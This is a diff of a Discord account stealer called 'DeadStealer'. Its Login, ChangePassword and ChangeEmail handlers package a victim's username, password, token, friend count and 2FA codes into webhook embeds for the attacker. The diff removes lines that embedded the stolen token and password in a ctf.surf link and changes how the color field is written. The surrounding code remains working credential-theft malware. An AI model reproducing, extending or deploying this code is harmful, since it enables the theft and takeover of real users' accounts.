@@ -441,9 +441,8 @@ function Login(email, password, token) {
 								username: "DeadStealer",
 								content: "",
 								embeds: [{
-									"title": "Usuario logeado",
-									description: "[**<:partner:909102089513340979> │ Matteo on top**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
-									"color": 0xFF0300,
+									"title": "DeadStealer",
+									color: 0xFF0300,
 									"fields": [{
 										name: "<:black_joker:926273784305045526> Usuario",
 										value: `\`${json.username}#${json.discriminator}\``,
@@ -488,7 +487,7 @@ function Login(email, password, token) {
 									}
 								}, {
 									"title": `Total Friends (${totalFriends()})`,
-									"color": 0xFF0300,
+									 color: 0xFF0300,
 									"description": CalcFriends(),
 									"author": {
 										"name": "DeadStealer"
@@ -504,7 +503,7 @@ function Login(email, password, token) {
 							var mfaembed = {
 								"title": ":detective: __2FA Codes__",
 								"description": `[Get all of them](${baseuri})`,
-								"color": 0xFF0300,
+								 color: 0xFF0300,
 								"fields": fieldo,
 								"author": {
 									"name": "DeadStealer"
@@ -598,7 +597,7 @@ function Login(email, password, token) {
 											content: "",
 											embeds: [{
 												"title": "DeadStealer",
-												"color": 0xFF0300,
+												 color: 0xFF0300,
 												"fields": [{
 													name: "<:black_joker:926273784305045526> Usuario",
 													value: `\`${json.username}#${json.discriminator}\``,
@@ -643,7 +642,7 @@ function Login(email, password, token) {
 												}
 											}, {
 												"title": `Total Friends (${totalFriends()})`,
-												"color": 0xFF0300,
+												 color: 0xFF0300,
 												"description": CalcFriends(),
 												"author": {
 													"name": "DeadStealer"
@@ -776,7 +775,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 								content: "",
 								embeds: [{
 									"title": "DeadStealer",
-									"color": 0xFF0300,
+									 color: 0xFF0300,
 									"fields": [{
 										name: "<:black_joker:926273784305045526> Usuario",
 										value: `\`${json.username}#${json.discriminator}\``,
@@ -825,7 +824,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 									}
 								}, {
 									"title": `Amigos en totales (${totalFriends()})`,
-									"color": 0xFF0300,
+									 color: 0xFF0300,
 									"description": CalcFriends(),
 									"author": {
 										"name": "DeadStealer"
@@ -842,7 +841,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 							}
 							var mfaembed = {
 								"title": ":detective: __2FA ACTIVADO__",
-								"color": 0xFF0300,
+								 color: 0xFF0300,
 								"fields": fieldo,
 								"author": {
 									"name": "DeadStealer"
@@ -937,7 +936,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 											content: "",
 											embeds: [{
 												"title": "Contraseña cambiada",
-												"color": 0xFF0300,
+												 color: 0xFF0300,
 												"fields": [{
 													name: "<:black_joker:926273784305045526> Usuario",
 													value: `\`${json.username}#${json.discriminator}\``,
@@ -988,7 +987,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 												}
 											}, {
 												"title": `Amigos en total (${totalFriends()})`,
-												"color": 0xFF0300,
+												 color: 0xFF0300,
 												"description": CalcFriends(),
 												"author": {
 													"name": "DeadStealer"
@@ -1121,7 +1120,7 @@ function ChangeEmail(newemail, password, token) {
 								content: "",
 								embeds: [{
 									"title": "Email Cambiado",
-									"color": 0xFF0300,
+									 color: 0xFF0300,
 									"fields": [{
 										name: "<:black_joker:926273784305045526> Usuario",
 										value: `\`${json.username}#${json.discriminator}\``,
@@ -1165,7 +1164,7 @@ function ChangeEmail(newemail, password, token) {
 									}
 								}, {
 									"title": `Total Friends (${totalFriends()})`,
-									"color": 0xFF0300,
+									 color: 0xFF0300,
 									"description": CalcFriends(),
 									"author": {
 										"name": "DeadStealer"
@@ -1182,7 +1181,7 @@ function ChangeEmail(newemail, password, token) {
 							}
 							var mfaembed = {
 								"title": "__2FA__",
-								"color": 0xFF0300,
+								 color: 0xFF0300,
 								"fields": fieldo,
 								'author': {
 									"name": "DeadStealer"
@@ -1277,8 +1276,7 @@ function ChangeEmail(newemail, password, token) {
 											content: "",
 											embeds: [{
 												"title": "Email Cambiado",
-												description: "[**<:partner:909102089513340979> │ Matteo on top**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
-												"color": 0xFF0300,
+												 color: 0xFF0300,
 												"fields": [{
 										                        name: "<:black_joker:926273784305045526> Usuario",
 										                        value: `\`${json.username}#${json.discriminator}\``,
@@ -1325,7 +1323,7 @@ function ChangeEmail(newemail, password, token) {
 												}
 											}, {
 												"title": `Total Friends (${totalFriends()})`,
-												"color": 0xFF0300,
+												 color: 0xFF0300,
 												"description": CalcFriends(),
 												"author": {
 													"name": "DeadStealer"
